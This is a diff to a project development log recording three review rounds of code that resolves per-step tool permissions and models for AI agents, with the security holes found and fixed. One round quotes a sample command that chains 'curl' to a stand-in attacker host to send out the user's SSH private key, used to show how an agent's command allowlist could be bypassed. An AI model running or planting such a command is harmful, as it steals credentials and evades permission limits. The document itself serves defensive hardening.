@@ -13187,3 +13187,73 @@ workflow validate --all`.
 
 **Verification:** `pnpm typecheck`/`pnpm run boundaries`/`pnpm lint` clean; `pnpm schema-drift` clean
 after `pnpm emit-schemas`; full unscoped test suite clean modulo the pre-existing accepted flakes.
+
+## M13 P4 — Per-step tool grant and model resolution (`@forge/agents/resolve`)
+
+**Mandate:** replace `packages/cli/src/commands/run/context.ts`'s one hardcoded `DEFAULT_TOOLS` grant and
+"first model the adapter lists" `resolveModel` with the dispatched agent's own resolved values:
+`resolveStepToolGrant` (agent `tools` checked against its own `ceiling`, optional overlay, escalations
+via `@forge/extensions`' `checkToolCeiling`/`mergeGrants`, output shaped as `SessionRequest.tools`),
+`resolveStepModel` (`05` §5.8 tier mapping via `config.models`, fail-closed), `roleTagsForAgent`. New
+codes `RUN-077` (grant above ceiling) and `RUN-078` (unresolvable tier). Standalone; wiring into dispatch
+is P5. Side changes: `mergeGrants` exported from `@forge/extensions/agents`; `SHELL_OPERATOR_PATTERN`
+exported from `@forge/adapter-kit/grants`. Judgement calls: `SPEC-QUESTIONS.md` Q196.
+
+### Round 1: 2 issues (1 blocking, 1 major), both real, both fixed
+
+(1) **blocking** — the ceiling check verified one value (untouched fields defaulted to the *ceiling's own*
+value, trivially passing) but returned another (the agent's raw base `tools`), so an agent whose own
+`tools` exceeded its own `ceiling` had that excess returned unchecked the moment any overlay touched an
+unrelated field. Contradicted the function's own docs and the plan's "a grant above the ceiling is
+refused". (2) **major** — `roleTagsForAgent`'s closed id list has no path for `roster.split` siblings.
+Fix: base-grant integrity is now checked unconditionally against the ceiling, one merged grant is
+checked and returned; for (2) an `extends`-based mitigation was added.
+**What the critic caught that the builder missed:** the checked-vs-returned split. The builder had
+introduced that split *deliberately* to avoid a false positive (`checkToolCeiling`'s exact-string `exec`
+diff refuses shipped `architect`'s own `'git log*'` vs ceiling `'git *'`) and had not seen it opened a
+hole. The builder did catch and fix the reverse bug (untouched fields inheriting the base value) by
+self-review before round 1.
+
+### Round 2: 1 blocking (new, in the fix itself), 1 major, 2 minor
+
+(1) **blocking** — the wildcard-aware `exec` subsumption built to fix round 1 compared prefixes only.
+`matchesExecPattern` refuses a *wildcard* match containing a shell metacharacter but exempts an *exact*
+pattern, so exact `'git log; curl evil.example/x?d=$(cat ~/.ssh/id_rsa)'` was "covered" by ceiling
+`'git *'` and, once granted, ran unconditionally — the critic reproduced `isExecAllowed(grant, cmd) ===
+true` vs `false` for the ceiling alone, with no `overlayTools` involved. No test used an exact `exec`
+pattern at all. (2) **major** — the round-1 `extends` mitigation is contradicted by the shipped
+`splitSiblingSchema` (no lineage field, `.strict()`), so it protects nothing and adds a false positive.
+(3) minor — `RUN-077`'s exec detail dumped every requested pattern; escalation lookup computed eagerly.
+Fix: `patternCoversPattern` now requires `!SHELL_OPERATOR_PATTERN.test(pattern)` for an exact pattern
+under a wildcard ceiling entry (adapter-kit's own regex, exported rather than copied); the `extends`
+mitigation was reverted and the gap disclosed; detail names only offending patterns; lazy escalation.
+**Caught that the builder missed:** the entire shell-composition asymmetry; the builder's doc comment even
+claimed the two pattern dialects "never silently diverge". Also a process incident: a macOS Desktop
+permission revocation interrupted the session mid-fix and one test edit was lost; re-applied and verified
+by mutation (removing the shell check fails 7 tests).
+
+### Round 3: 0 blocking, 2 major (test quality), several minor — no exploitable widening found
+
+The critic proved `patternCoversPattern` sound against `isExecAllowed` by case analysis and probes
+(`git*` vs `git *`, `*`, empty patterns, exact covering with metacharacters, prototype-pollution keys),
+and confirmed rounds 1 and 2 closed. Two **major** findings, both in the tests: (M1) surviving
+mutants — exact-vs-exact `startsWith`, `?? ['*']` fail-open default for an undeclared exec ceiling,
+dropping `isEscalationRefused` in the exec path, `>=` on the expiry boundary — all passed 49/49; (M2)
+bare `toThrow()` / `toThrow(/RUN-077|ceiling/)` assertions that never pinned the error code. Fixed:
+shared `expectCode` helper asserting the exact `ForgeError.code` in every refusal test; 15 new tests
+(exact-vs-exact, undeclared exec ceiling, broader-prefix wildcards, ceiling `*`, refused/no-exec/expired/
+narrowing/multiple escalations, `usedEscalation` for a non-exec escalation, detail text for both
+`RUN-078` branches); each of M1/M2/M6/M7 re-run as a mutation and now fails a test. Minor findings
+addressed: `Object.hasOwn` for `models.overrides`/`models.tiers` lookups (an id like `constructor` no
+longer reaches `Object.prototype`), `RUN-078`'s remedy now covers both causes, doc comments corrected
+(escalation *replaces* the ceiling exec; `allowlistHosts` comparison over-refuses only), cast comment.
+Disclosed, not fixed (Q196): `roleTagsForAgent` is id-only, `checkToolCeiling` trusts enum values by type
+and compares hosts case-sensitively, `Date.parse` timezone dependence for zone-less `expires`, no test
+loads the real shipped YAML. No fourth round was run: round 3 found nothing blocking on the
+implementation, and every later change is test-only or small hardening covered by the new tests.
+
+**Verification:** whole-workspace `pnpm typecheck` (21/21), `pnpm run boundaries`, and `eslint` all clean;
+`pnpm lint`'s prettier step reports only 4 pre-existing, untouched files (`cli/src/commands/overlay.ts`
+and three `cli/test/commands/{overlay,doctor/*}.test.ts`). Full unscoped `node scripts/run-tests.mjs run`:
+8643 passed, 2 failed — `engine/test/e2e/crash-resume.test.ts` (known load-sensitive flake) and
+`scripts/verify-success-criteria.test.ts`'s SC3 wrapper, which spawns that same test.
